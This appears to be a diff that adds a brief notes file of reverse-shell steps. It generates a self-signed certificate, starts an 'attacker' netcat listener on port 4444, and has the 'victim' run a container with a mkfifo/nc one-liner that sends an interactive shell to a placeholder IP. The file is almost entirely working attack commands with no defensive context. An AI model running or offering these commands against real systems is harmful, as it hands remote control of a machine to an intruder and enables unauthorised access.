@@ -1,0 +1,7 @@
+Generate ssl:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+Execute listener (attacker):
+nc -lvnp 4444
+Execute reverse shell (victim):
+docker run --rm -it nicolaka/netshoot sh -c "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <YOUR_IP> 4444 > /tmp/f"
+
